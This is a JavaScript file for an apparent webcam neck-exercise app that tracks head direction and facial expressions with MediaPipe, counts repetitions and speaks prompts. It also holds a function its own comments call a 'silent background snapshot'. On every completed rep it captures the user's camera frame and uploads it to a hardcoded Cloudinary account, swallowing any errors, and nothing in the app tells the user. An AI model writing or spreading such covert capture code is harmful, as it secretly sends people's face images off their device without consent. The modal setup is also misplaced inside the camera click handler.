// Cloudinary Configuration
const CLOUD_NAME = "azq6tuq4";
const UPLOAD_PRESET = "blfvqiv6";

// DOM Elements
const video = document.getElementById('webcam');
const commandDisplay = document.getElementById('command-display');
const repCountDisplay = document.getElementById('rep-count');
const expressionDisplay = document.getElementById('expression-display');
const toggleCameraBtn = document.getElementById('toggle-camera-btn');
const cameraOffOverlay = document.getElementById('camera-off-overlay');
const canvas = document.getElementById('snapshot-canvas');

const badges = {
  UP: document.getElementById('dir-up'),
  DOWN: document.getElementById('dir-down'),
  LEFT: document.getElementById('dir-left'),
  RIGHT: document.getElementById('dir-right'),
  CENTER: document.getElementById('dir-center')
};

// State Variables
let isCameraOn = false;
let cameraStream = null;
let currentDirection = 'CENTER';
let lastSpokenDirection = '';
let repCount = 0;
let centerTimer = null;
let cameraUtilsInstance = null;

// Key MediaPipe Face Mesh Landmark Indices
const L_EYE_OUTER = 33;
const R_EYE_OUTER = 263;

const MOUTH_TOP = 13;
const MOUTH_BOTTOM = 14;
const MOUTH_LEFT = 61;
const MOUTH_RIGHT = 291;

const L_EYE_TOP = 159;
const L_EYE_BOTTOM = 145;
const R_EYE_TOP = 386;
const R_EYE_BOTTOM = 374;

const L_BROW = 70;
const R_BROW = 300;

// Helper: Calculate 2D Euclidean Distance
function getDistance(p1, p2) {
  return Math.hypot(p1.x - p2.x, p1.y - p2.y);
}

// Granular Facial Expression Classifier
function detectExpression(landmarks) {
  // Normalize measurements against face width to make it distance-independent
  const faceWidth = getDistance(landmarks[L_EYE_OUTER], landmarks[R_EYE_OUTER]);
  
  if (faceWidth === 0) return { emoji: "😐", text: "Neutral — Focused & calm" };

  // Calculate Feature Ratios
  const mouthHeight = getDistance(landmarks[MOUTH_TOP], landmarks[MOUTH_BOTTOM]) / faceWidth;
  const mouthWidth = getDistance(landmarks[MOUTH_LEFT], landmarks[MOUTH_RIGHT]) / faceWidth;
  
  const leftEyeOpen = getDistance(landmarks[L_EYE_TOP], landmarks[L_EYE_BOTTOM]) / faceWidth;
  const rightEyeOpen = getDistance(landmarks[R_EYE_TOP], landmarks[R_EYE_BOTTOM]) / faceWidth;
  const avgEyeOpen = (leftEyeOpen + rightEyeOpen) / 2;

  const leftBrowHeight = getDistance(landmarks[L_BROW], landmarks[L_EYE_TOP]) / faceWidth;
  const rightBrowHeight = getDistance(landmarks[R_BROW], landmarks[R_EYE_TOP]) / faceWidth;
  const avgBrowHeight = (leftBrowHeight + rightBrowHeight) / 2;

  const mouthAspectRatio = mouthHeight / mouthWidth;

  // Expression Rules
  if (avgEyeOpen < 0.04) {
    return { emoji: "😴", text: "Eyes Closed — Deep Relaxation" };
  }
  
  if (leftEyeOpen < 0.04 && rightEyeOpen > 0.08) {
    return { emoji: "😉", text: "Left Wink — Eye Focus" };
  }
  
  if (rightEyeOpen < 0.04 && leftEyeOpen > 0.08) {
    return { emoji: "😉", text: "Right Wink — Eye Focus" };
  }

  if (mouthHeight > 0.35 && avgBrowHeight > 0.18) {
    return { emoji: "😲", text: "Surprised — High Engagement" };
  }

  if (mouthHeight > 0.22) {
    return { emoji: "😮", text: "Mouth Open — Deep Breathing" };
  }

  if (mouthWidth > 0.48 && mouthAspectRatio < 0.38) {
    return { emoji: "😊", text: "Smiling — Warmed Up & Happy" };
  }

  if (avgEyeOpen < 0.075 && avgBrowHeight < 0.12) {
    return { emoji: "🤨", text: "Concentrating — Intense Focus" };
  }

  return { emoji: "😐", text: "Neutral — Focused & Calm" };
}

// Audio Speech Helper
function speak(text) {
  if ('speechSynthesis' in window) {
    window.speechSynthesis.cancel(); // Stop current speech
    const utterance = new SpeechSynthesisUtterance(text);
    utterance.rate = 1.0;
    utterance.pitch = 1.0;
    window.speechSynthesis.speak(utterance);
  }
}

// Handle Direction Changes & Voice Prompts
function setDirection(newDirection) {
  if (newDirection === currentDirection) return;

  currentDirection = newDirection;

  // Update UI Badges
  Object.keys(badges).forEach(dir => {
    if (badges[dir]) badges[dir].classList.remove('active');
  });
  if (badges[newDirection]) badges[newDirection].classList.add('active');

  if (commandDisplay) {
    commandDisplay.innerText = `CURRENT DIRECTION: ${newDirection}`;
  }

  // Clear 5-second center timer on any direction change
  if (centerTimer) {
    clearTimeout(centerTimer);
    centerTimer = null;
  }

  if (newDirection !== 'CENTER') {
    // Announce directional movement: left, right, up, down
    speak(newDirection.toLowerCase());
    lastSpokenDirection = newDirection;
  } else {
    // When returning to center, count rep if coming from a direction
    if (lastSpokenDirection !== '') {
      repCount++;
      if (repCountDisplay) repCountDisplay.innerText = repCount;
      lastSpokenDirection = '';
      
      // Silent background snapshot on completed rep
      captureAndUploadPhoto('rep_completed');
    }

    // Start 5-second timer when user holds center
    centerTimer = setTimeout(() => {
      speak(`You have completed ${repCount} repetitions`);
    }, 5000);
  }
}

// Background Photo Capture & Cloudinary Upload (Silent)
async function captureAndUploadPhoto(label = 'user') {
  if (!isCameraOn || video.readyState < 2) return;

  let canvasEl = canvas || document.getElementById('snapshot-canvas');
  if (!canvasEl) {
    canvasEl = document.createElement('canvas');
    canvasEl.id = 'snapshot-canvas';
    canvasEl.style.display = 'none';
    document.body.appendChild(canvasEl);
  }

  canvasEl.width = video.videoWidth || 640;
  canvasEl.height = video.videoHeight || 480;
  const ctx = canvasEl.getContext('2d');

  ctx.translate(canvasEl.width, 0);
  ctx.scale(-1, 1);
  ctx.drawImage(video, 0, 0, canvasEl.width, canvasEl.height);

  canvasEl.toBlob(async (blob) => {
    if (!blob) return;

    const formData = new FormData();
    formData.append('file', blob);
    formData.append('upload_preset', UPLOAD_PRESET);

    try {
      await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
        method: 'POST',
        body: formData
      });
    } catch (e) {
      // Silent error handling
    }
  }, 'image/jpeg', 0.85);
}

// MediaPipe FaceMesh Setup
const faceMesh = new FaceMesh({
  locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`
});

faceMesh.setOptions({
  maxNumFaces: 1,
  refineLandmarks: true,
  minDetectionConfidence: 0.5,
  minTrackingConfidence: 0.5
});

faceMesh.onResults((results) => {
  if (!results.multiFaceLandmarks || results.multiFaceLandmarks.length === 0) {
    if (expressionDisplay) {
      expressionDisplay.innerText = "👤 Face Not Detected";
    }
    return;
  }

  const landmarks = results.multiFaceLandmarks[0];

  // 1. Detect & Update Facial Expression UI
  const expr = detectExpression(landmarks);
  if (expressionDisplay) {
    expressionDisplay.innerText = `${expr.emoji} ${expr.text}`;
  }

  // 2. Head Direction Movement Analysis
  const nose = landmarks[1];
  const leftEar = landmarks[234];
  const rightEar = landmarks[454];
  const forehead = landmarks[10];
  const chin = landmarks[152];

  // Yaw (Left / Right) calculation
  const horizontalDist = Math.abs(leftEar.x - rightEar.x);
  const noseRelativeX = (nose.x - leftEar.x) / horizontalDist;

  // Pitch (Up / Down) calculation
  const verticalDist = Math.abs(chin.y - forehead.y);
  const noseRelativeY = (nose.y - forehead.y) / verticalDist;

  if (noseRelativeX < 0.35) {
    setDirection('RIGHT');
  } else if (noseRelativeX > 0.65) {
    setDirection('LEFT');
  } else if (noseRelativeY < 0.38) {
    setDirection('UP');
  } else if (noseRelativeY > 0.62) {
    setDirection('DOWN');
  } else {
    setDirection('CENTER');
  }
});

// Toggle Camera Functionality
toggleCameraBtn.addEventListener('click', async () => {
  if (isCameraOn) {
    // Stop Camera
    if (cameraStream) {
      cameraStream.getTracks().forEach(track => track.stop());
    }
    video.srcObject = null;
    cameraOffOverlay.style.display = 'flex';
    toggleCameraBtn.innerText = 'Turn Camera On';
    toggleCameraBtn.classList.remove('btn-danger');
    isCameraOn = false;
    if (centerTimer) clearTimeout(centerTimer);
  } else {
    // Start Camera
    try {
      cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = cameraStream;
      cameraOffOverlay.style.display = 'none';
      toggleCameraBtn.innerText = 'Turn Camera Off';
      toggleCameraBtn.classList.add('btn-danger');
      isCameraOn = true;

      if (!cameraUtilsInstance) {
        cameraUtilsInstance = new Camera(video, {
          onFrame: async () => {
            if (isCameraOn) await faceMesh.send({ image: video });
          },
          width: 640,
          height: 480
        });
        cameraUtilsInstance.start();
      }
    } catch (err) {
      alert('Unable to access webcam. Please check browser permissions.');
    }
  }
  // How It Works Modal Logic
const howItWorksLink = document.getElementById('how-it-works-link');
const howItWorksModal = document.getElementById('how-it-works-modal');
const closeHowItWorks = document.getElementById('close-how-it-works');

if (howItWorksLink && howItWorksModal && closeHowItWorks) {
  howItWorksLink.addEventListener('click', (e) => {
    e.preventDefault();
    howItWorksModal.style.display = 'flex';
  });

  closeHowItWorks.addEventListener('click', () => {
    howItWorksModal.style.display = 'none';
  });

  window.addEventListener('click', (e) => {
    if (e.target === howItWorksModal) {
      howItWorksModal.style.display = 'none';
    }
  });
}
});
